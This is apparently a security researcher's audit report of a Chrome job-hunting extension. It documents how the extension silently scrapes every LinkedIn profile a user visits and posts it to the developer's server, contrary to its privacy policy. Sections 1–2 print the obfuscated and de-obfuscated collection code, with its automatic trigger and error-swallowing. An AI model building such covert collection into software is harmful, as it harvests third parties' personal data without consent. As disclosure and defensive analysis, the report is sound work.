# JR Academy Chrome Extension "求职匠 Job Hunter" Silently Uploads Every LinkedIn Profile You Visit — Full Source Code Audit

## JR Academy (匠人学院 / jiangren.com.au) Chrome Extension Security Audit: Technical Forensic Analysis of Silent Data Exfiltration

> **Audit target**: 求职匠 Job Hunter v0.9.18 by JR Academy (Chrome Web Store ID: `kbecnmcienhaopoibckmbijngmcakplf`)
>
> **Developer**: JR Academy Pty Ltd (匠人学院), https://jiangren.com.au, Brisbane QLD Australia
>
> **Method**: Static analysis of all JavaScript source files extracted from the publicly available CRX package on the Chrome Web Store
>
> **Principle**: This report documents only facts that can be directly verified from the source code. No speculation.

---

## Keywords / 关键词

JR Academy, JR Academy Chrome extension, JR Academy privacy, JR Academy data collection, 匠人学院, 匠人学院 Chrome 插件, 匠人学院隐私, 求职匠, Job Hunter Chrome extension, jiangren.com.au, JR Academy LinkedIn, JR Academy security audit, JR Academy data harvesting, 匠人学院数据泄露, JR Academy Pty Ltd, JR Academy Australia, JR Academy Brisbane

---

## TL;DR

**求职匠 Job Hunter**, a Chrome extension developed by **JR Academy** (匠人学院, https://jiangren.com.au), contains a hidden automatic data exfiltration mechanism. When a user with this extension installed visits **any** LinkedIn profile page, the extension — **without any user interaction** — extracts the complete profile data (name, work history, education, skills, and 10+ other fields) and silently uploads it via HTTP POST to JR Academy's backend server at `api.jiangren.com.au`.

JR Academy's own privacy policy explicitly states:

> *"We do not passively monitor your browsing activity"*
>
> *"Content extraction occur only when you explicitly trigger them"*

The code proves otherwise.

**[简体中文版](README.zh-CN.md)** | **[繁體中文版](README.zh-TW.md)**

---

## Table of Contents

1. [The Smoking Gun: Automatic Profile Upload](#1-the-smoking-gun-automatic-profile-data-upload)
2. [Alumni Queries Leak Browsing History](#2-automatic-alumni-queries-leak-browsing-history)
3. [JR Academy's Privacy Policy vs Reality](#3-jr-academys-privacy-policy-says-the-exact-opposite)
4. [Insecure Cookie Configuration](#4-insecure-cookie-configuration)
5. [What This Report Does NOT Claim](#5-what-this-report-does-not-claim)
6. [The Bigger Picture](#6-the-bigger-picture-extensions-as-distributed-scraping-networks)
7. [Reproduction Guide](#7-reproduction-guide)
8. [FAQ](#8-faq)

---

## 1. The Smoking Gun: Automatic Profile Data Upload

### 1.1 The Upload Function

The Service Worker of JR Academy's 求职匠 Job Hunter extension contains a function (obfuscated as `R()`) that POSTs LinkedIn profile data to JR Academy's backend:

```javascript
// De-obfuscated equivalent logic
let lastReportedUrl = "";
let lastReportedTime = 0;

function reportProfileToServer(profileData) {
    if (!profileData?.name || !profileData?.profileUrl) return;

    const url = profileData.profileUrl;
    const now = Date.now();

    // Throttle: skip if same URL reported within 10 seconds
    if (url === lastReportedUrl && now - lastReportedTime < 10000) return;
    lastReportedUrl = url;
    lastReportedTime = now;

    getAuthHeaders().then(headers => {
        // Only upload when user is logged in to JR Academy
        headers.Authorization && fetch(
            "https://api.jiangren.com.au/ai-tutor/linkedin-profile",
            {
                method: "POST",
                headers: headers,
                body: JSON.stringify(profileData)  // Full profile object
            }
        ).catch(() => {})  // Silently swallow all errors — user sees nothing
    }).catch(() => {})
}
```

**Original obfuscated code** (searchable in the extracted CRX — file `assets/service-worker.ts-BSerYTM6.js`):

```javascript
function R(e){if(!(e!=null&&e.name)||!(e!=null&&e.profileUrl))return;const t=e.profileUrl,a=Date.now();t===J&&a-j<1e4||(J=t,j=a,m().then(r=>{r.Authorization&&fetch(y("/ai-tutor/linkedin-profile"),{method:"POST",headers:r,body:JSON.stringify(e)}).catch(()=>{})}).catch(()=>{}))}
```

Where `y()` is defined as:

```javascript
const me = "https://api.jiangren.com.au";
function y(e) { return `${me}${e}` }
```

### 1.2 The Automatic Trigger — Zero User Interaction

This upload function is called from the `PAGE_TYPE_CHANGED` message handler. It fires **automatically** when the user navigates to any LinkedIn profile page — no click, no shortcut, no opt-in:

```javascript
// De-obfuscated equivalent logic
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === "PAGE_TYPE_CHANGED") {
        const tabId = sender.tab?.id;

        // When page type is "profile" — fire after 3-second delay
        message.payload.pageType === "profile" && tabId && setTimeout(() => {
            chrome.tabs.sendMessage(tabId, { type: "EXTRACT_PROFILE_DATA" })
                .then(result => {
                    result?.profileData && reportProfileToServer(result.profileData)
                })
                .catch(() => {})
        }, 3000)  // 3-second delay to avoid detection

        return false;
    }
});
```

**Original obfuscated code:**

```javascript
if(e.type==="PAGE_TYPE_CHANGED"){const i=(o=t.tab)==null?void 0:o.id;return i!==void 0&&(q.set(i,e.payload.pageType),chrome.runtime.sendMessage({type:"PAGE_TYPE_CHANGED",payload:e.payload}).catch(()=>{}),e.payload.pageType==="profile"&&i&&setTimeout(()=>{chrome.tabs.sendMessage(i,{type:"EXTRACT_PROFILE_DATA"}).then(l=>{l!=null&&l.profileData&&R(l.profileData)}).catch(()=>{})},3e3)),!1}
```

### 1.3 What JR Academy Receives

The `profileData` object uploaded to `api.jiangren.com.au` contains:

```javascript
{
    name:                "Full Name",
    headline:            "Professional Headline",
    about:               "Complete About section text",
    location:            "Geographic Location",
    profileUrl:          "https://www.linkedin.com/in/...",
    isOwnProfile:        true/false,
    experience:          [{ title, company, duration, description, isCurrent }],
    education:           [{ school, degree, field, years }],
    skills:              ["Skill 1", "Skill 2", ...],
    certifications:      [...],
    languages:           [...],
    volunteerExperience: [...],
    profileImageUrl:     "https://...",
    connectionLevel:     "1st/2nd/3rd",
    connections:         "500+ connections"
}
```

A **comprehensive profile extraction** covering 15+ data fields — sent to JR Academy's server every time you view a LinkedIn profile.

### 1.4 The Complete Data Flow

```
User browses any LinkedIn profile page
    |
    v
Content Script detects URL matches linkedin.com/in/*
    |
    v
Sends PAGE_TYPE_CHANGED { pageType: "profile" } to Service Worker
    |
    v
Service Worker waits 3 seconds (setTimeout 3000ms)
    |
    v
Sends EXTRACT_PROFILE_DATA back to Content Script
    |
    v
Profile Extractor parses the entire page DOM
    |
    v
Service Worker receives complete profileData object
    |
    v
R() POSTs full JSON to https://api.jiangren.com.au/ai-tutor/linkedin-profile
    |
    v
.catch(() => {})  — user sees nothing, knows nothing
```

**Zero user interaction at any step.**

---

## 2. Automatic Alumni Queries Leak Browsing History

JR Academy's extension also contains an alumni-checking function (obfuscated as `_e()`) that sends the visited profile's URL and name to JR Academy's backend on every LinkedIn profile page visit:

```javascript
async function checkAlumni(linkedinUrl, name) {
    const params = new URLSearchParams({ linkedinUrl, name });
    const response = await fetch(
        `https://api.jiangren.com.au/ai-tutor/alumni/check?${params}`,
        { headers: authHeaders }
    );
}
```

**Original obfuscated code:**

```javascript
async function _e(e,t){const a=I.get(e);if(a)return a;try{const o=await m(),n=new URLSearchParams({linkedinUrl:e,name:t}),s=await fetch(y(`/ai-tutor/alumni/check?${n}`),{headers:o});
```

This is triggered automatically by the Content Script — **no user action required**. JR Academy's backend receives a log of every LinkedIn profile the extension user views.

---

## 3. JR Academy's Privacy Policy Says the Exact Opposite

JR Academy's privacy policy (last updated 16 March 2026, [archived on Wayback Machine](https://web.archive.org/web/20260403061621/https://jiangren.com.au/privacy-policy)) makes the following claims. Each is directly contradicted by the code.

### Contradiction 1: JR Academy Claims "No Passive Monitoring"

| JR Academy's Privacy Policy | Code Reality |
|------------------------------|-------------|
| *"We do not passively monitor your browsing activity."* | `PAGE_TYPE_CHANGED` handler automatically extracts and uploads data when the user merely navigates to a LinkedIn profile. No click, no shortcut, no opt-in. |
| *"No background data collection, automatic screenshots, or passive browsing monitoring occurs."* | The entire `PAGE_TYPE_CHANGED` → 3s delay → `EXTRACT_PROFILE_DATA` → `R()` chain runs in the background with zero user interaction. |

### Contradiction 2: JR Academy Claims "Only When You Explicitly Trigger"

| JR Academy's Privacy Policy | Code Reality |
|------------------------------|-------------|
| *"Our Chrome browser extensions collect additional data only when you actively use their features."* | The trigger is a URL pattern match, not a user action. |
| *"Content extraction occur only when you explicitly trigger them (e.g., pressing a keyboard shortcut or clicking a button)."* | The code path from `PAGE_TYPE_CHANGED` to `R()` contains **zero** user interaction checks — no `confirm()`, no click listener, no keyboard shortcut detection. |

### Contradiction 3: JR Academy Massively Underreports Data Scope

| JR Academy's Privacy Policy | Code Reality |
|------------------------------|-------------|
| Data collected: *"Job posting content from supported job sites; current page URL"* | Actually uploads to api.jiangren.com.au: full name, headline, about, location, complete work history, education, skills, certifications, languages, volunteer experience, profile photo, connection level — **15+ field types, none disclosed** |

### Contradiction 4: JR Academy Does Not Disclose Third-Party Data Collection

JR Academy's privacy policy only describes collection of the extension user's own data. It **never mentions** collecting data about third-party LinkedIn users — the people whose profiles are being viewed.

The `isOwnProfile` field proves JR Academy's developers explicitly distinguish between "own profile" and "someone else's profile." Yet the upload function `R()` **does not check this field** — all profiles are uploaded to JR Academy's servers indiscriminately:

```javascript
function R(e) {
    if (!(e?.name) || !(e?.profileUrl)) return;  // Only checks name + URL exist
    // No check for isOwnProfile — uploads everything to api.jiangren.com.au
    // ...
}
```

---

## 4. Insecure Cookie Configuration

JR Academy's extension stores authentication tokens with `SameSite=None`:

```javascript
await chrome.cookies.set({
    url: "https://jiangren.com.au",
    name: "jr_ext_token",
    value: token,                        // Plaintext token
    sameSite: "no_restriction",          // SameSite=None — any site can send this cookie cross-origin
    expirationDate: now + 30 * 86400    // 30-day expiry
});

await chrome.cookies.set({
    url: "https://jiangren.com.au",
    name: "jr_ext_user",
    value: encodeURIComponent(JSON.stringify(userInfo)),  // User info as plaintext JSON
    sameSite: "no_restriction",
    expirationDate: now + 30 * 86400
});
```

Session Storage access level is also elevated:

```javascript
chrome.storage.session.setAccessLevel({
    accessLevel: "TRUSTED_AND_UNTRUSTED_CONTEXTS"
})
```

---

## 5. What This Report Does NOT Claim

To maintain credibility, the following modules in JR Academy's extension were verified to be **local-only** with no automatic backend transmission:

| Module | Calls JR Academy Backend? | Verdict |
|--------|--------------------------|---------|
| Connections Extractor + Classifier | **No** | Local feature |
| Message Extractor + Classifier | **No** | Local feature |
| Feed Scanner | **No** | Local feature |
| Company Extractor | **No** | Local feature |
| Quick Reply Templates | **No** | Local feature |
| Post Injector | **No** | Local feature |
| Job Save (right-click) | Yes, but **user-initiated** | Legitimate feature |

These are reasonable local features. This report focuses exclusively on the automatic, silent data exfiltration to JR Academy's servers described in Sections 1-4.

---

## 6. The Bigger Picture: Extensions as Distributed Scraping Networks

JR Academy's approach illustrates an underappreciated technique: **using extension users as unwitting data collection proxies.**

Unlike traditional scrapers, this model:

- **Bypasses anti-bot protections** — Requests come from real browsers with real sessions
- **Distributes across IPs** — Each user has a different IP
- **Leverages authenticated sessions** — Accesses data visible only to logged-in users
- **Scales with installs** — No infrastructure to maintain

For every 1,000 active users of JR Academy's extension browsing 10 LinkedIn profiles/day, JR Academy's backend at `api.jiangren.com.au` accumulates **10,000 complete professional profiles daily** — at zero infrastructure cost.

---

## 7. Reproduction Guide

All findings about JR Academy's extension can be independently verified in under 5 minutes.

### Step 1: Download and Extract

```bash
# Download the CRX from Google's public API
curl -L -o extension.crx \
  "https://clients2.google.com/service/update2/crx?response=redirect&prodversion=131.0.0.0&acceptformat=crx2,crx3&x=id%3Dkbecnmcienhaopoibckmbijngmcakplf%26uc"

# Extract (using provided script)
python3 extract.py extension.crx
```

### Step 2: Run Automated Verification

```bash
./verify.sh source/
```

### Step 3: Manual Verification

```bash
# Find JR Academy's upload endpoint
grep -r "ai-tutor/linkedin-profile" source/

# Find the automatic trigger
grep -r "PAGE_TYPE_CHANGED" source/

# Find JR Academy's backend URL
grep -r "api.jiangren.com.au" source/

# Find the SameSite=None cookie
grep -r "no_restriction" source/

# Trace the chain: PAGE_TYPE_CHANGED → "profile" → setTimeout(3e3) → EXTRACT_PROFILE_DATA → R() → fetch(POST)
```

---

## 8. FAQ

### Is JR Academy the same as 匠人学院?

Yes. JR Academy Pty Ltd (ABN registered in Australia) operates under the brand 匠人学院 (Jiàngrén Xuéyuàn). Their website is https://jiangren.com.au and they are based in Brisbane, Queensland, Australia.

### What is 求职匠 Job Hunter?

求职匠 Job Hunter is a Chrome browser extension developed by JR Academy (匠人学院). It is marketed as an AI-powered job hunting assistant for job seekers in Australia and New Zealand, primarily targeting Chinese-speaking users.

### Does JR Academy's other extension "考证匠 AI Tutor" have the same problem?

No. A separate audit of 考证匠 AI Tutor (Chrome Web Store ID: `pkgdmdjeabhaihgiffdndpomegejmhhd`) confirmed that it does **not** contain the same automatic profile upload mechanism. All data transmission in 考证匠 is user-initiated.

### Is this legal?

This report documents technical facts. Whether JR Academy's data collection practices violate the Australian Privacy Act 1988 (APPs), LinkedIn's User Agreement, or other applicable laws is for regulators and legal authorities to determine. Reports have been filed with Google, LinkedIn, and a formal complaint to the OAIC is pending.

### What should I do if I have JR Academy's extension installed?

1. Uninstall 求职匠 Job Hunter immediately
2. Clear cookies for `jiangren.com.au`
3. Check your LinkedIn account for unusual activity
4. Understand that every LinkedIn profile you viewed while the extension was active may have been uploaded to JR Academy's servers at `api.jiangren.com.au`

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 2026-04-03 | Source code audit of JR Academy's extension completed |
| 2026-04-03 | Reports filed with Google Chrome Web Store and LinkedIn Trust & Safety |
| 2026-04-03 | Public disclosure |
| Pending | Formal privacy complaint to JR Academy (privacy@jiangren.com.au) |
| +30 days | Escalation to OAIC (Office of the Australian Information Commissioner) |

---

## Archived Evidence

| Source | Archive |
|--------|---------|
| JR Academy's Privacy Policy | [Wayback Machine 2026-04-03](https://web.archive.org/web/20260403061621/https://jiangren.com.au/privacy-policy) |
| Chrome Web Store Listing | [Wayback Machine 2026-04-03](https://web.archive.org/web/20260403061642/https://chromewebstore.google.com/detail/%E6%B1%82%E8%81%8C%E5%8C%A0-job-hunter/kbecnmcienhaopoibckmbijngmcakplf) |
| Extension CRX Package | [evidence/extension.crx](evidence/extension.crx) (SHA-256: `c34771c4...`) |

---

## Legal Note

This analysis was conducted through static code review of a publicly available Chrome Web Store package. No dynamic testing, reverse engineering of JR Academy's backend APIs, or unauthorized access was performed. CRX files are publicly downloadable via Google's update API — extracting and analyzing them is standard security research practice.

---

## Repository Availability Statement

This repository will **not** be voluntarily deleted or made private by its maintainer. If this repository becomes inaccessible at any point, it should be assumed that this is due to **external pressure, legal threats, or other force majeure** — not a voluntary retraction of the findings.

The author stands behind every technical fact documented in this report. All findings are independently verifiable using the evidence and scripts provided.

Readers are encouraged to **fork this repository** to ensure the information remains available.

---

## License

This report is released under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). You are free to share and adapt this material with attribution.
